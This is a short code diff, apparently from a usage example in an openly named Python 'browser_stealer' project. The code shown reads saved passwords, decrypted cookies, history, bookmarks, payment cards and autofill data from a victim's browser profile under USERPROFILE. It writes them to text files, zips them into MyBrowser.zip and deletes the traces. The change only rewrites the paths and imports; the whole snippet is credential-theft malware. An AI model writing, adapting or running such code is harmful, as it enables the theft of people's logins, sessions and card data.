@@ -43,17 +43,17 @@ import browser_stealer
 
 
 def MyBrowser():
-    browser_stealer.fetch_passwords(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\Login Data", r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State")
-    browser_stealer.decrypt_fetch_cookies(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\Network\Cookies", r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State")
-    browser_stealer.fetch_cookies(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\Network\Cookies")
-    browser_stealer.fetch_history(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\History")
-    browser_stealer.fetch_downloads(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\History")
-    browser_stealer.fetch_bookmarks(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\Bookmarks")
-    browser_stealer.fetch_payment(r"AppData\Local\%FOLDER%\%FOLDER%\User Data\%PROFILE%\Web Data", r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State")
-    browser_stealer.fetch_autofill(r"AppData\Local\%FOLDER%\%FOLDER%e\User Data\%PROFILE%\Web Data")
-    
-    browser_stealer.zip("MyBrowser.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
-    browser_stealer.delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    fetch_passwords(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Login Data"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
+    decrypt_fetch_cookies(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Network\Cookies"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
+    fetch_cookies(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Network\Cookies"))
+    fetch_history(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\History"))
+    fetch_downloads(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\History"))
+    fetch_bookmarks(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Bookmarks"))
+    fetch_payment(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Web Data"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
+    fetch_autofill(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Web Data"))
+
+    u.zip("MyBrowser.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    u.delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
 MyBrowser()
 ```
